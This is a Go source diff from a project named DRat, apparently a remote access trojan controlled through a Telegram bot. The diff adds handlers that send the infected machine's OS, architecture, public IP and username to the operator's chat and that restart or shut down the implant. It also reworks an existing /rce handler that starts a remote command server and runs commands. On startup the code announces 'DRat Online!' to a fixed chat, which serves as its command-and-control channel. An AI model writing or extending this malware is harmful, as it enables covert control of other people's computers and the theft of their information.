@@ -3,7 +3,7 @@
  * @Date: 2023-03-05 21:40:21
  * @version:
  * @LastEditors: SpenserCai
- * @LastEditTime: 2023-03-06 10:35:58
+ * @LastEditTime: 2023-03-12 21:24:56
  * @Description: file content
  */
 package message
@@ -11,6 +11,8 @@ package message
 import (
 	DRatAttack "DRat/attack"
 	DRatConfig "DRat/config"
+	DRatUtil "DRat/util"
+	"runtime"
 	"strings"
 
 	tele "gopkg.in/telebot.v3"
@@ -53,15 +55,16 @@ func TeleBotCommand() {
 		return c.Send(helpMessage)
 	})
 	DRatConfig.TelBot.Handle("/rce", func(c tele.Context) error {
+		cmdHelp := "Please input command:\n" +
+			"init: Start RCE Server\n" +
+			"stop: Stop RCE Server\n" +
+			"command: Run command"
 		// 读取命令的参数
 		args := c.Args()
-		if len(args) == 0 {
-			return c.Send("Please input command:\n" +
-				"init: Start RCE Server\n" +
-				"stop: Stop RCE Server\n" +
-				"command: Run command")
-		}
 		args = args[:len(args)-1]
+		if len(args) == 0 {
+			return c.Send(cmdHelp)
+		}
 		argsStr := strings.Join(args, " ")
 		if args[0] == "init" {
 			// 如果RCE Server已经启动，则先关闭
@@ -92,7 +95,42 @@ func TeleBotCommand() {
 		}
 
 	})
+	DRatConfig.TelBot.Handle("/sysinfo", func(c tele.Context) error {
+		sysInfo := ""
+		// 获取操作系统
+		sysInfo += "OS: " + runtime.GOOS + "\n"
+		// 获取架构
+		sysInfo += "Arch: " + runtime.GOARCH + "\n"
+		// 获取公网IP
+		publicIp, err := DRatUtil.GetPublicIp()
+		if err != nil {
+			return c.Send(err.Error())
+		}
+		sysInfo += "Public IP: " + publicIp + "\n"
+		// 获取用户名
+		currentUser, err := DRatUtil.GetCurrentUser()
+		if err != nil {
+			return c.Send(err.Error())
+		}
+		sysInfo += "User: " + currentUser.Username + "\n"
+		return c.Send(sysInfo)
 
+	})
+	DRatConfig.TelBot.Handle("/reboot_drat", func(c tele.Context) error {
+		err := DRatUtil.StartDrat()
+		if err != nil {
+			return c.Send(err.Error())
+		} else {
+			// 退出当前进程
+			defer DRatUtil.ExitProcess()
+		}
+		return c.Send("DRat will rebooting...")
+	})
+	DRatConfig.TelBot.Handle("/shutdown_drat", func(c tele.Context) error {
+		// 退出当前进程
+		defer DRatUtil.ExitProcess()
+		return c.Send("DRat will shutdown...")
+	})
 	DRatConfig.TelBot.Send(tele.ChatID(-DRatConfig.TELBOT_CHAT_ID), "DRat Online!")
 	DRatConfig.TelBot.Start()
 }
